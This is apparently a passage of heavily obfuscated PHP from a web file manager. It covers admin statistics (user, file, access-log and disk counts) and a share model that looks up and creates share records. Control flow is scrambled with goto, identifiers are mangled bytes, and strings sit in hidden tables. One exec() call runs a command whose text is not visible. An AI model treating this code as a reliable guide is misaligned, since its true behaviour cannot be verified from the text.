$cé¹íĞµÒ[$AÑáà—Ãáœ[1621]] = $cé¹íĞµÒ[$AÑáà—Ãáœ[731]]; } foreach ($B’³èŠø½æ[$d’¾šµì] as $FÉ«¶¡Ğ¡‘ => $b–Óƒí®ç) { $F†“½Œëè» = array($AÑáà—Ãáœ[232] => $cé¹íĞµÒ[$AÑáà—Ãáœ[232]], $AÑáà—Ãáœ[1432] => $b–Óƒí®ç); $F†“½Œëè»[$E¥‹‹àëêÎ[$d’¾šµì]] = isset($cé¹íĞµÒ[$FÉ«¶¡Ğ¡‘]) ? $cé¹íĞµÒ[$FÉ«¶¡Ğ¡‘] : 0; $dƒªÀğÃ®[] = $F†“½Œëè»; } } goto E¸ ÒÒ”´; Aª‡íÒÈéÍ: } public function validDate($CÊá—Ô×Ù¸, $aâ†‘Å³ñÚ) { goto Fßƒƒõ‘µ¹; aÒç’¹î¶¬: return $cİ¦å‰›ù­; goto f–¼‘ï¥…Ë; Fßƒƒõ‘µ¹: $C–Š¿øÒ› =& $_SERVER[£¶ä½¶¢]; $eğø¥ĞóÕÜ = date($C–Š¿øÒ›[1624], strtotime($C–Š¿øÒ›[1625])); $cİ¦å‰›ù­ = array($eğø¥ĞóÕÜ); goto a¥à±ì; a¥à±ì: switch ($CÊá—Ô×Ù¸) { case $C–Š¿øÒ›[1507]: $fìÄó„ÉŞ¸ = mktime(0, 0, 0, date($C–Š¿øÒ›[1641]), date($C–Š¿øÒ›[1250]) - date($C–Š¿øÒ›[1312]) + 7 - 7, date($C–Š¿øÒ›[1642])); $AÚ‚ğÛÔÎ = 0; do { $D¾ã¹äŸ“ = date($C–Š¿øÒ›[1624], $fìÄó„ÉŞ¸ - 3600 * 24 * 7 * $AÚ‚ğÛÔÎ); $cİ¦å‰›ù­[] = $D¾ã¹äŸ“; $AÚ‚ğÛÔÎ++; } while ($aâ†‘Å³ñÚ < $D¾ã¹äŸ“); break; case $C–Š¿øÒ›[1505]: $AÚ‚ğÛÔÎ = 1; do { $C¯µíÚ¡£ = date($C–Š¿øÒ›[1643], strtotime("\55\40{$AÚ‚ğÛÔÎ}\x20\155\x6f\156\x74\150\163")); $cİ¦å‰›ù­[] = $C¯µíÚ¡£; $AÚ‚ğÛÔÎ++; } while ($aâ†‘Å³ñÚ < $C¯µíÚ¡£); break; case $C–Š¿øÒ›[1644]: $a¦ôó‰À×È = (int) date($C–Š¿øÒ›[1642], strtotime($aâ†‘Å³ñÚ)); $AÆõÚíä˜ = (int) date($C–Š¿øÒ›[1642]); if ($a¦ôó‰À×È >= $AÆõÚíä˜) { break; } for ($a¦ôó‰À×È; $a¦ôó‰À×È < $AÆõÚíä˜; $a¦ôó‰À×È++) { $cİ¦å‰›ù­[] = $a¦ôó‰À×È . $C–Š¿øÒ›[1645]; } break; default: break; } if ($aâ†‘Å³ñÚ > end($cİ¦å‰›ù­)) { array_pop($cİ¦å‰›ù­); } sort($cİ¦å‰›ù­); goto aÒç’¹î¶¬; f–¼‘ï¥…Ë: } public function listTable($FËÙ¡Ú‘øâ) { $D©°·¤öƒ = ucfirst($FËÙ¡Ú‘øâ); return Model($D©°·¤öƒ)->listData(); } public function option($cáªİĞ±Í£) { $AØÈâƒ Û = $_SERVER[£¶ä½¶¢][1646] . ucfirst($cáªİĞ±Í£); return $this->{$AØÈâƒ Û}(); } private function optionUser() { goto cì§ï†ó¨å; Dõ©¼¼Œ¾: return array($c„ø¼Ñôœ§[727] => (int) $EòÊÖšæÙ‚, $c„ø¼Ñôœ§[1649] => (int) ($EòÊÖšæÙ‚ - $F’ˆï¯³Ü°), $c„ø¼Ñôœ§[1650] => (int) $F’ˆï¯³Ü°, $c„ø¼Ñôœ§[1651] => (int) $føØ•¢†¡, $c„ø¼Ñôœ§[1652] => $b†Ñ„…•¬ô); goto EœÔ’—İ†; CèÎïâ¨§¡: if (!$b†Ñ„…•¬ô) { $b†Ñ„…•¬ô = 1; } $c„¯ñÔÄ† = array($c„ø¼Ñôœ§[1648] => array($c„ø¼Ñôœ§[969], $e“À¿ÆÙ”“)); $føØ•¢†¡ = Model($c„ø¼Ñôœ§[514])->where($c„¯ñÔÄ†)->count($c„ø¼Ñôœ§[1526]); goto Dõ©¼¼Œ¾; f‹É¥¬Úˆæ: if ($a¡»ö¬ÈÁâ < $e“À¿ÆÙ”“) { $a¡»ö¬ÈÁâ = $e“À¿ÆÙ”“; } $c„¯ñÔÄ† = array($c„ø¼Ñôœ§[1648] => array($c„ø¼Ñôœ§[969], $a¡»ö¬ÈÁâ)); $b†Ñ„…•¬ô = (int) Model($c„ø¼Ñôœ§[514])->where($c„¯ñÔÄ†)->count($c„ø¼Ñôœ§[1526]); goto CèÎïâ¨§¡; cì§ï†ó¨å: $c„ø¼Ñôœ§ =& $_SERVER[£¶ä½¶¢]; $EòÊÖšæÙ‚ = Model($c„ø¼Ñôœ§[514])->count($c„ø¼Ñôœ§[1526]); $F’ˆï¯³Ü° = Model($c„ø¼Ñôœ§[514])->where($c„ø¼Ñôœ§[1647])->count($c„ø¼Ñôœ§[1526]); goto Bƒ¯½ñØ¿; Bƒ¯½ñØ¿: $f°ÜêŒîëÂ = intval($GLOBALS[$c„ø¼Ñôœ§[16]][$c„ø¼Ñôœ§[356]][$c„ø¼Ñôœ§[1486]]) / 3600; $a¡»ö¬ÈÁâ = strtotime("\55{$f°ÜêŒîëÂ}\40\x68\x6f\x75\162\x73"); $e“À¿ÆÙ”“ = strtotime(date($c„ø¼Ñôœ§[1628])); goto f‹É¥¬Úˆæ; EœÔ’—İ†: } private function optionFile() { goto e…õ©éÅ“Æ; cˆ«ÌÔãøÌ: $fÓêùğ‚ÁÊ = Model($dĞÈÌŠé‡Ò[798])->where($E«¿ ¯¬¿Ó)->sum($dĞÈÌŠé‡Ò[88]); $d¾Æï™õŞ = Model($dĞÈÌŠé‡Ò[798])->where($E«¿ ¯¬¿Ó)->count($dĞÈÌŠé‡Ò[403]); return array($dĞÈÌŠé‡Ò[731] => $eôËâ¾¨šŸ, $dĞÈÌŠé‡Ò[1621] => $DŒò½åìÖñ, $dĞÈÌŠé‡Ò[1653] => $eôËâ¾¨šŸ - $DŒò½åìÖñ, $dĞÈÌŠé‡Ò[1654] => (int) $fÓêùğ‚ÁÊ, $dĞÈÌŠé‡Ò[733] => (int) $B‰Ò¨¡‡Ë¶, $dĞÈÌŠé‡Ò[1655] => (int) $d¾Æï™õŞ); goto dœƒ‡–”Øô; e…õ©éÅ“Æ: $dĞÈÌŠé‡Ò =& $_SERVER[£¶ä½¶¢]; $Bäø…™İ„  = $this->sourceSize(); $eôËâ¾¨šŸ = $Bäø…™İ„ [$dĞÈÌŠé‡Ò[88]]; goto Dë…ò¬«; Dë…ò¬«: $DŒò½åìÖñ = $Bäø…™İ„ [$dĞÈÌŠé‡Ò[1621]]; $B‰Ò¨¡‡Ë¶ = Model($dĞÈÌŠé‡Ò[798])->where(array($dĞÈÌŠé‡Ò[411] => 0))->count($dĞÈÌŠé‡Ò[403]); $E«¿ ¯¬¿Ó = array($dĞÈÌŠé‡Ò[411] => 0, $dĞÈÌŠé‡Ò[204] => array($dĞÈÌŠé‡Ò[969], strtotime(date($dĞÈÌŠé‡Ò[1628])))); goto cˆ«ÌÔãøÌ; dœƒ‡–”Øô: } private function optionAccess() { $F÷…öÙÛÃ„ =& $_SERVER[£¶ä½¶¢]; return array($F÷…öÙÛÃ„[727] => $this->typeLogCnt(), $F÷…öÙÛÃ„[117] => $this->typeLogCnt($F÷…öÙÛÃ„[117]), $F÷…öÙÛÃ„[438] => $this->typeLogCnt($F÷…öÙÛÃ„[438]), $F÷…öÙÛÃ„[1656] => $this->typeLogCnt($F÷…öÙÛÃ„[1656]), $F÷…öÙÛÃ„[1657] => $this->typeLogCnt($F÷…öÙÛÃ„[1657]), $F÷…öÙÛÃ„[570] => $this->typeLogCnt($F÷…öÙÛÃ„[43], $F÷…öÙÛÃ„[1632])); } private function typeLogCnt($cª›¤øô = '', $c©‚äÂ®ë½ = "\151\x64") { goto d­¤ñ°ƒ½; d­¤ñ°ƒ½: $a½©ëîœ¶ =& $_SERVER[£¶ä½¶¢]; $DĞÏ•¸ŠÇ = array($a½©ëîœ¶[117] => array($a½©ëîœ¶[1658], $a½©ëîœ¶[1659]), $a½©ëîœ¶[438] => array($a½©ëîœ¶[1660], $a½©ëîœ¶[1661]), $a½©ëîœ¶[1656] => array($a½©ëîœ¶[1662], $a½©ëîœ¶[1663], $a½©ëîœ¶[1664]), $a½©ëîœ¶[1657] => array($a½©ëîœ¶[1665], $a½©ëîœ¶[1666]), $a½©ëîœ¶[1667] => array($a½©ëîœ¶[1668], $a½©ëîœ¶[1669], $a½©ëîœ¶[1670])); $DåÓÕ»ôºĞ = strtotime(date($a½©ëîœ¶[1628])); goto Fğƒİ¨‘ĞŞ; d·ÉÎà–é‹: return (int) $EÑİ¼â¯É±; goto C‚ø¨¯‡ÔŞ; Fğƒİ¨‘ĞŞ: $F´Ûª¯·À‘ = array($a½©ëîœ¶[204] => array($a½©ëîœ¶[969], $DåÓÕ»ôºĞ)); if ($cª›¤øô) { $F´Ûª¯·À‘[$a½©ëîœ¶[39]] = array($a½©ëîœ¶[17], $DĞÏ•¸ŠÇ[$cª›¤øô]); } $EÑİ¼â¯É± = Model($a½©ëîœ¶[1631])->where($F´Ûª¯·À‘)->count($c©‚äÂ®ë½); goto d·ÉÎà–é‹; C‚ø¨¯‡ÔŞ: } private function optionServer() { goto C¶­§ùîÁ; dÚ†’½¦Ë: if ($Cøå¶Âöà¦ == $c‚Šá³œÎ[763]) { $e¢ ƒ·©Í‡ = explode($c‚Šá³œÎ[1164], $fµİ™¦†±[$c‚Šá³œÎ[929]]); $Cøå¶Âöà¦ = $e¢ ƒ·©Í‡[0]; } if ($Cøå¶Âöà¦ == $c‚Šá³œÎ[766] || $Cøå¶Âöà¦ == $c‚Šá³œÎ[767]) { $D·‡øŸŞ† = Model()->db()->query($c‚Šá³œÎ[1671]); $BÍ½®ÉøÓ = $D·‡øŸŞ†[0] && isset($D·‡øŸŞ†[0][$c‚Šá³œÎ[1431]]) ? $D·‡øŸŞ†[0][$c‚Šá³œÎ[1431]] : 0; $Cøå¶Âöà¦ = $c‚Šá³œÎ[1672] . ($BÍ½®ÉøÓ ? $c‚Šá³œÎ[18] . $BÍ½®ÉøÓ : $c‚Šá³œÎ[43]); } $böÂäóØÂª = $GLOBALS[$c‚Šá³œÎ[16]][$c‚Šá³œÎ[356]][$c‚Šá³œÎ[800]]; goto Bª¢Şå™; d¿ìéÍôëó: $a½¬¼Îá×ğ = array($c‚Šá³œÎ[790] => $E“²õ•ó¼•[$c‚Šá³œÎ[401]]); $CÄ­ïˆ±ê³ = Model($c‚Šá³œÎ[458])->where($a½¬¼Îá×ğ)->sum($c‚Šá³œÎ[88]); $c°½‹“Ü„ = explode($c‚Šá³œÎ[60], $_SERVER[$c‚Šá³œÎ[152]]); goto DßÄõ„‡È; DßÄõ„‡È: $BØ…ïóµµ† = $c°½‹“Ü„[0]; $fµİ™¦†± = $GLOBALS[$c‚Šá³œÎ[16]][$c‚Šá³œÎ[27]]; $Cøå¶Âöà¦ = $fµİ™¦†±[$c‚Šá³œÎ[930]]; goto dÚ†’½¦Ë; C¶­§ùîÁ: $c‚Šá³œÎ =& $_SERVER[£¶ä½¶¢]; $dÛÀ¬Öë¾ñ = $this->diskDriver(); $E“²õ•ó¼• = KodIO::defaultDriver(); goto d¿ìéÍôëó; Bª¢Şå™: return array($c‚Šá³œÎ[1673] => $dÛÀ¬Öë¾ñ ? $dÛÀ¬Öë¾ñ[$c‚Šá³œÎ[1674]] : 0, $c‚Šá³œÎ[1675] => $dÛÀ¬Öë¾ñ ? $dÛÀ¬Öë¾ñ[$c‚Šá³œÎ[1676]] : 0, $c‚Šá³œÎ[1677] => (int) $E“²õ•ó¼•[$c‚Šá³œÎ[1674]] * 1024 * 1024 * 1024, $c‚Šá³œÎ[1678] => (int) $CÄ­ïˆ±ê³, $c‚Šá³œÎ[1679] => ucfirst($BØ…ïóµµ†), $c‚Šá³œÎ[1680] => $c‚Šá³œÎ[1681] . PHP_VERSION, $c‚Šá³œÎ[1682] => phpBuild64() ? 64 : 32, $c‚Šá³œÎ[726] => str_replace($c‚Šá³œÎ[1683], $c‚Šá³œÎ[946], $Cøå¶Âöà¦), $c‚Šá³œÎ[356] => ucfirst($böÂäóØÂª), $c‚Šá³œÎ[38] => $_SERVER[$c‚Šá³œÎ[1684]]); goto bĞó‚ÆÂô; bĞó‚ÆÂô: } private function diskDriver() { goto Eó¾øÇ¬”; c²ÖÊêë†: $DèÉæ‡†ä‹ = $cæ‘µğ„ - @disk_free_space($c·‡Ø’Ôô•); return array($c»ß¼‰¼«[1674] => $cæ‘µğ„, $c»ß¼‰¼«[1676] => $DèÉæ‡†ä‹); goto d´œŞñ»¾Ú; Eó¾øÇ¬”: $c»ß¼‰¼« =& $_SERVER[£¶ä½¶¢]; $c·‡Ø’Ôô• = $c»ß¼‰¼«[18]; $DÛÑ‡æ§«ê = $GLOBALS[$c»ß¼‰¼«[16]][$c»ß¼‰¼«[1685]] == $c»ß¼‰¼«[1686]; goto f“Ğ©ÓòÌ”; f“Ğ©ÓòÌ”: if ($DÛÑ‡æ§«ê) { $c·‡Ø’Ôô• = $c»ß¼‰¼«[1687]; if (function_exists($c»ß¼‰¼«[1688])) { exec($c»ß¼‰¼«[1689], $E˜ˆ×îÊ¤); $c·‡Ø’Ôô• = $E˜ˆ×îÊ¤[1] . $c»ß¼‰¼«[18]; } } if (!file_exists($c·‡Ø’Ôô•)) { return; } $cæ‘µğ„ = @disk_total_space($c·‡Ø’Ôô•); goto c²ÖÊêë†; d´œŞñ»¾Ú: } public function fileChart($D «­®Áá‰) { goto Bß«î¬£Ÿ¶; F¡²¼Şğ¡ƒ: $eµìëê±†„[$C¢ó·Ü˜ğä[412]] = 2; $D÷¾›¤áŞ = Model($C¢ó·Ü˜ğä[798])->where($eµìëê±†„)->sum($C¢ó·Ü˜ğä[88]); return array($C¢ó·Ü˜ğä[731] => $C´ô¸Š÷Ø½[$C¢ó·Ü˜ğä[88]], $C¢ó·Ü˜ğä[1621] => $C´ô¸Š÷Ø½[$C¢ó·Ü˜ğä[1621]], $C¢ó·Ü˜ğä[1622] => (int) $b‚œ¹ùŸÅ, $C¢ó·Ü˜ğä[1623] => (int) $D÷¾›¤áŞ); goto BƒÜ¦¤Š»Û; Bß«î¬£Ÿ¶: $C¢ó·Ü˜ğä =& $_SERVER[£¶ä½¶¢]; if (isset($D «­®Áá‰[$C¢ó·Ü˜ğä[1526]])) { return Model($C¢ó·Ü˜ğä[798])->userFileTypeProfile($D «­®Áá‰[$C¢ó·Ü˜ğä[1526]]); } if (isset($D «­®Áá‰[$C¢ó·Ü˜ğä[1690]])) { return Model($C¢ó·Ü˜ğä[798])->groupFileTypeProfile($D «­®Áá‰[$C¢ó·Ü˜ğä[1690]]); } goto Fæê™ßÄ¤°; Fæê™ßÄ¤°: $C´ô¸Š÷Ø½ = $this->sourceSize(); $eµìëê±†„ = array($C¢ó·Ü˜ğä[486] => 0, $C¢ó·Ü˜ğä[412] => 1); $b‚œ¹ùŸÅ = Model($C¢ó·Ü˜ğä[798])->where($eµìëê±†„)->sum($C¢ó·Ü˜ğä[88]); goto F¡²¼Şğ¡ƒ; BƒÜ¦¤Š»Û: } private function sourceSize() { $f•×İÀ¾™ =& $_SERVER[£¶ä½¶¢]; $aØØáŒ…½ = Model($f•×İÀ¾™[798])->where(array($f•×İÀ¾™[411] => 0))->sum($f•×İÀ¾™[88]); $ešÀšó—Ç = Model($f•×İÀ¾™[458])->sum($f•×İÀ¾™[88]); if ($ešÀšó—Ç > $aØØáŒ…½) { $ešÀšó—Ç = $aØØáŒ…½; } return array($f•×İÀ¾™[88] => (int) $aØØáŒ…½, $f•×İÀ¾™[1621] => (int) $ešÀšó—Ç); } } goto DÜÕê¹æêÁ; C³†Ïô—®†: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\145"; protected $dataAuto = array(array("\155\157\x64\151\146\171\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\x74\54\165\160\x64\141\x74\x65", "\x66\x75\x6e\143\164\x69\x6f\156"), array("\x63\x72\145\x61\x74\x65\124\151\x6d\x65", "\164\x69\155\145", "\x69\156\x73\145\x72\164", "\x66\165\x6e\x63\164\x69\157\156"), array("\157\x70\x74\151\157\x6e\163", '', "\151\156\163\x65\x72\x74\x2c\x75\x70\x64\x61\164\145\x2c\163\x65\x6c\145\x63\x74", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($f¯‚Â¾ÌØÄ) { $E¬ğÁà¶ª =& $_SERVER[£¶ä½¶¢]; $e˜ŒŸÚò´¶ = isset($f¯‚Â¾ÌØÄ[0]) ? $f¯‚Â¾ÌØÄ[0] : !1; return array($E¬ğÁà¶ª[1818] => array(USER_ID, $E¬ğÁà¶ª[1819]), $E¬ğÁà¶ª[1762] => array($e˜ŒŸÚò´¶, $E¬ğÁà¶ª[1820])); } protected function listSimple() { $E‘¨•ˆÊ´ƒ = array($_SERVER[£¶ä½¶¢][1526] => USER_ID); $bï§ãªñŞ¸ = $this->field($this->fieldList)->where($E‘¨•ˆÊ´ƒ)->select(); return $bï§ãªñŞ¸ ? $bï§ãªñŞ¸ : array(); } protected function getInfo($Dó¹ß  ²Ù, $bÓÚ´‚³Ü· = false) { $B‰¤ÁÒ²‡¬ =& $_SERVER[£¶ä½¶¢]; if ($bÓÚ´‚³Ü·) { return $this->_getShareInfo(array($B‰¤ÁÒ²‡¬[476] => $Dó¹ß  ²Ù)); } $dğÓ ‚‘ÚÍ = $this->cacheFunctionGet($B‰¤ÁÒ²‡¬[1769], $Dó¹ß  ²Ù); return $dğÓ ‚‘ÚÍ; } public function getInfoByHash($FØİï†’ƒ) { return $this->_getShareInfo(array($_SERVER[£¶ä½¶¢][478] => $FØİï†’ƒ)); } public function getInfoByPath($cª—–ÚÃÂÙ) { $cÁ—…í÷’“ =& $_SERVER[£¶ä½¶¢]; $e¬Ä™ñªäÈ = array($cÁ—…í÷’“[1526] => USER_ID, $cÁ—…í÷’“[403] => $cª—–ÚÃÂÙ); return $this->_getShareInfo($e¬Ä™ñªäÈ); } public function getInfoBySourcePath($CÀœÜÍ”•›) { $fÇŒ¯Îƒ™Í =& $_SERVER[£¶ä½¶¢]; $c¸´Å‚Òóñ = array($fÇŒ¯Îƒ™Í[1526] => USER_ID, $fÇŒ¯Îƒ™Í[1069] => $CÀœÜÍ”•›); return $this->_getShareInfo($c¸´Å‚Òóñ); } private function _getShareInfo($EÓÅóäÕÃ¾) { goto EöÑçÍÖ†í; eÓä¿­³¹: $EÓÅóäÕÃ¾ = array($C¿äÄÙæ©Ô[476] => $F©“ºŒÙî[$C¿äÄÙæ©Ô[476]]); $A‰ÑÒä = $C¿äÄÙæ©Ô[1821]; $F›ùÖŠË‚¢ = Model($C¿äÄÙæ©Ô[572])->order($C¿äÄÙæ©Ô[401])->field($A‰ÑÒä)->where($EÓÅóäÕÃ¾)->select(); goto cö„¶ôê¶; EöÑçÍÖ†í: $C¿äÄÙæ©Ô =& $_SERVER[£¶ä½¶¢]; $F©“ºŒÙî = $this->where($EÓÅóäÕÃ¾)->find(); if (!$F©“ºŒÙî) { return !1; } goto eÓä¿­³¹; cö„¶ôê¶: if ($F©“ºŒÙî[$C¿äÄÙæ©Ô[403]] == $C¿äÄÙæ©Ô[201]) { $F©“ºŒÙî[$C¿äÄÙæ©Ô[95]] = IO::info($F©“ºŒÙî[$C¿äÄÙæ©Ô[1069]]); } else { $F©“ºŒÙî[$C¿äÄÙæ©Ô[95]] = Model($C¿äÄÙæ©Ô[1203])->pathInfo($F©“ºŒÙî[$C¿äÄÙæ©Ô[403]]); } $F©“ºŒÙî[$C¿äÄÙæ©Ô[1822]] = $F›ùÖŠË‚¢; return $F©“ºŒÙî; goto c¬ßƒÍÑ¬Ï; c¬ßƒÍÑ¬Ï: } protected function getInfoAuth($Añ¤¾†–ô¥) { $dˆÈ‚šàØŠ =& $_SERVER[£¶ä½¶¢]; $A’½ëÎ´˜Ò = $this->getInfo($Añ¤¾†–ô¥); $A’½ëÎ´˜Ò[$dˆÈ‚šàØŠ[414]] = Model($dˆÈ‚šàØŠ[490])->authMake($A’½ëÎ´˜Ò[$dˆÈ‚šàØŠ[1822]]); return $A’½ëÎ´˜Ò; } protected function listData($eï®˜´³‚‚ = null, $DéíêÒ¼¥¸ = 300) { $Cˆìˆèƒ’· =& $_SERVER[£¶ä½¶¢]; $FÀ”á£Ôì = array(array($Cˆìˆèƒ’·[481] => array($Cˆìˆèƒ’·[967], 0), $Cˆìˆèƒ’·[483] => array($Cˆìˆèƒ’·[967], 0), $Cˆìˆèƒ’·[1823] => $Cˆìˆèƒ’·[1777])); if ($eï®˜´³‚‚ == $Cˆìˆèƒ’·[1824]) { $FÀ”á£Ôì = array($Cˆìˆèƒ’·[481] => 1); } else { if ($eï®˜´³‚‚ == $Cˆìˆèƒ’·[1054]) { $FÀ”á£Ôì = array($Cˆìˆèƒ’·[483] => 1); } } $FÀ”á£Ôì[$Cˆìˆèƒ’·[1526]] = USER_ID; $B…ßÊíê¯ = $this->where($FÀ”á£Ôì)->selectPage($DéíêÒ¼¥¸); return $B…ßÊíê¯; } protected function listToMe($E§Ö¸Ï•àå = 300) { goto b¯Òº¶ôó«; b¯Òº¶ôó«: $dì†ÔŸÌ =& $_SERVER[£¶ä½¶¢]; $e›ÀÓÒ”‹Ë = Model($dì†ÔŸÌ[1825])->userGroupParents(USER_ID); $C¶Ô»éÆ‰ = array($dì†ÔŸÌ[557] => SourceModel::TYPE_USER, $dì†ÔŸÌ[492] => USER_ID); goto bô½é‰™„; bô½é‰™„: if ($e›ÀÓÒ”‹Ë) { $C¶Ô»éÆ‰ = array(array($dì†ÔŸÌ[557] => SourceModel::TYPE_USER, $dì†ÔŸÌ[492] => USER_ID), array($dì†ÔŸÌ[557] => SourceModel::TYPE_GROUP, $dì†ÔŸÌ[492] => array($dì†ÔŸÌ[17], $e›ÀÓÒ”‹Ë)), $dì†ÔŸÌ[1823] => $dì†ÔŸÌ[1777]); } $e¸ô—ğ¹ï¥ = Model($dì†ÔŸÌ[572])->where($C¶Ô»éÆ‰)->selectPage($E§Ö¸Ï•àå); $CŞ˜æ¸×µŞ = array_to_keyvalue_group($e¸ô—ğ¹ï¥[$dì†ÔŸÌ[376]], $dì†ÔŸÌ[476]); goto CñÓ¶ ­’ô; B‡ÙËÚÆ´: $bŠÃÅÆ ¹ = array($dì†ÔŸÌ[1827] => $B†ò¶¼ğ‘, $dì†ÔŸÌ[1828] => $e¸ô—ğ¹ï¥[$dì†ÔŸÌ[373]]); return $bŠÃÅÆ ¹; goto aÕ£†¡í¶; f¤“®ÕŞ¾: $B†ò¶¼ğ‘ = $this->field($dœË¹ªã¦ò)->where($C¶Ô»éÆ‰)->select(); foreach ($B†ò¶¼ğ‘ as $c…³´ïøİ˜ => &$fõ‡•ğÚ) { $fõ‡•ğÚ[$dì†ÔŸÌ[1822]] = $CŞ˜æ¸×µŞ[$fõ‡•ğÚ[$dì†ÔŸÌ[476]]]; } unset($fõ‡•ğÚ); goto B‡ÙËÚÆ´; CñÓ¶ ­’ô: if (!$CŞ˜æ¸×µŞ) { return $e¸ô—ğ¹ï¥; } $dœË¹ªã¦ò = $dì†ÔŸÌ[1826]; $C¶Ô»éÆ‰ = array($dì†ÔŸÌ[476] => array($dì†ÔŸÌ[419], array_keys($CŞ˜æ¸×µŞ))); goto f¤“®ÕŞ¾; aÕ£†¡í¶: } protected function shareAdd($BòôÀº²‡, $f¿‰»á¸Æ¹) { $e­›áõ™Íì =& $_SERVER[£¶ä½¶¢]; $C›¢ª²ÇÅ½ = $this->_addShareData($BòôÀº²‡, $f¿‰»á¸Æ¹); if (!empty($f¿‰»á¸Æ¹[$e­›áõ™Íì[1829]])) { $this->_shareAuthSet($C›¢ª²ÇÅ½, $f¿‰»á¸Æ¹[$e­›áõ™Íì[1829]]); } $this->shareEventAdd($BòôÀº²‡, $f¿‰»á¸Æ¹, $e­›áõ™Íì[1057]); return $C›¢ª²ÇÅ½; } private function shareEventAdd($F¾¨¡ï¿Æê, $c„å£Ñ‰–, $eËÃŸ°¤¢… = "\141\x64\x64") { goto Cµù‰º‡¨í; Cµù‰º‡¨í: $d´‚Æ„¾•¥ =& $_SERVER[£¶ä½¶¢]; if (!$F¾¨¡ï¿Æê || $F¾¨¡ï¿Æê == $d´‚Æ„¾•¥[201]) { return; } if ($eËÃŸ°¤¢… == $d´‚Æ„¾•¥[1057]) { if ($c„å£Ñ‰–[$d´‚Æ„¾•¥[481]] == $d´‚Æ„¾•¥[97]) { Model($d´‚Æ„¾•¥[541])->eventShare($F¾¨¡ï¿Æê, $d´‚Æ„¾•¥[1830]); } if ($c„å£Ñ‰–[$d´‚Æ„¾•¥[483]] == $d´‚Æ„¾•¥[97]) { Model($d´‚Æ„¾•¥[541])->eventShare($F¾¨¡ï¿Æê, $d´‚Æ„¾•¥[1831]); } return; } goto E‰ÛÃ»ÄÑƒ; E‰ÛÃ»ÄÑƒ: $dÂôÉ•­Ğº = $this->getInfoByPath($F¾¨¡ï¿Æê); $døÄì„Ş¢ = $d´‚Æ„¾•¥[1832]; if ($dÂôÉ•­Ğº[$d´‚Æ„¾•¥[481]] == $d´‚Æ„¾•¥[201] && $c„å£Ñ‰–[$d´‚Æ„¾•¥[481]] == $d´‚Æ„¾•¥[97]) { $døÄì„Ş¢ = $d´‚Æ„¾•¥[1830]; } goto f¡éÃÓÙò; f¡éÃÓÙò: if ($dÂôÉ•­Ğº[$d´‚Æ„¾•¥[481]] == $d´‚Æ„¾•¥[97] && $c„å£Ñ‰–[$d´‚Æ„¾•¥[481]] == $d´‚Æ„¾•¥[201]) { $døÄì„Ş¢ = $d´‚Æ„¾•¥[1833]; } if ($dÂôÉ•­Ğº[$d´‚Æ„¾•¥[483]] == $d´‚Æ„¾•¥[201] && $c„å£Ñ‰–[$d´‚Æ„¾•¥[483]] == $d´‚Æ„¾•¥[97]) { $døÄì„Ş¢ = $d´‚Æ„¾•¥[1831]; } if ($dÂôÉ•­Ğº[$d´‚Æ„¾•¥[483]] == $d´‚Æ„¾•¥[97] && $c„å£Ñ‰–[$d´‚Æ„¾•¥[483]] == $d´‚Æ„¾•¥[201]) { $døÄì„Ş¢ = $d´‚Æ„¾•¥[1834]; } goto AƒùÑíãŒÛ; AƒùÑíãŒÛ: Model($d´‚Æ„¾•¥[541])->eventShare($F¾¨¡ï¿Æê, $døÄì„Ş¢); return; goto cŞÅÜœ¤ñ¬; cŞÅÜœ¤ñ¬: } private function _addShareData($dÏ»›‡î„Å, $eŒà…óì¥ = array()) { goto Fç‚ãÕ©Ñ…; fØ­Œğ°í±: return $F›¾ºâİšù; goto E•í¬á‹ºğ; b¼ó¯İ‚Ÿ: $Bç½¥åòÎç = array($dÏ¦¼ºˆ¢¹[1518] => USER_ID, $dÏ¦¼ºˆ¢¹[418] => $dÏ»›‡î„Å, $dÏ¦¼ºˆ¢¹[1432] => $dÏ¦¼ºˆ¢¹[43], $dÏ¦¼ºˆ¢¹[481] => 0, $dÏ¦¼ºˆ¢¹[483] => 0, $dÏ¦¼ºˆ¢¹[1069] => $dÏ¦¼ºˆ¢¹[43], $dÏ¦¼ºˆ¢¹[314] => $dÏ¦¼ºˆ¢¹[43], $dÏ¦¼ºˆ¢¹[847] => $dÏ¦¼ºˆ¢¹[43], $dÏ¦¼ºˆ¢¹[1836] => 0, $dÏ¦¼ºˆ¢¹[1837] => 0, $dÏ¦¼ºˆ¢¹[484] => 0, $dÏ¦¼ºˆ¢¹[485] => $dÏ¦¼ºˆ¢¹[43], $dÏ¦¼ºˆ¢¹[478] => $dÏ¦¼ºˆ¢¹[43]); $c•¤­‰Ÿ‘ó = explode($dÏ¦¼ºˆ¢¹[57], $dÏ¦¼ºˆ¢¹[1838]); foreach ($c•¤­‰Ÿ‘ó as $aÈ‚ÔÏÆÇ™) { if (!isset($eŒà…óì¥[$aÈ‚ÔÏÆÇ™])) { continue; } $Bç½¥åòÎç[$aÈ‚ÔÏÆÇ™] = $eŒà…óì¥[$aÈ‚ÔÏÆÇ™]; } goto aÔŞ…ÛâÓ§; Fç‚ãÕ©Ñ…: $dÏ¦¼ºˆ¢¹ =& $_SERVER[£¶ä½¶¢]; $Cö£Çêõê = array($dÏ¦¼ºˆ¢¹[418] => $dÏ»›‡î„Å, $dÏ¦¼ºˆ¢¹[1518] => USER_ID); if ($dÏ»›‡î„Å == 0) { $Cö£Çêõê = array($dÏ¦¼ºˆ¢¹[1835] => $eŒà…óì¥[$dÏ¦¼ºˆ¢¹[1069]], $dÏ¦¼ºˆ¢¹[1518] => USER_ID); } goto b‚œù¥ç™í; aÔŞ…ÛâÓ§: $F›¾ºâİšù = $this->add($Bç½¥åòÎç); $C¢Ë„§‡° = array($dÏ¦¼ºˆ¢¹[478] => short_id($F›¾ºâİšù)); $this->where(array($dÏ¦¼ºˆ¢¹[475] => $F›¾ºâİšù))->save($C¢Ë„§‡°); goto fØ­Œğ°í±; b‚œù¥ç™í: if ($b©¿‚·İ„‡ = $this->where($Cö£Çêõê)->find()) { return $b©¿‚·İ„‡[$dÏ¦¼ºˆ¢¹[476]]; } if ($dÏ»›‡î„Å == 0) { $Fù—ª¼°Ÿš = array($dÏ¦¼ºˆ¢¹[38] => get_path_this($eŒà…óì¥[$dÏ¦¼ºˆ¢¹[86]])); } else { $Fù—ª¼°Ÿš = Model($dÏ¦¼ºˆ¢¹[798])->sourceInfo($dÏ»›‡î„Å); if 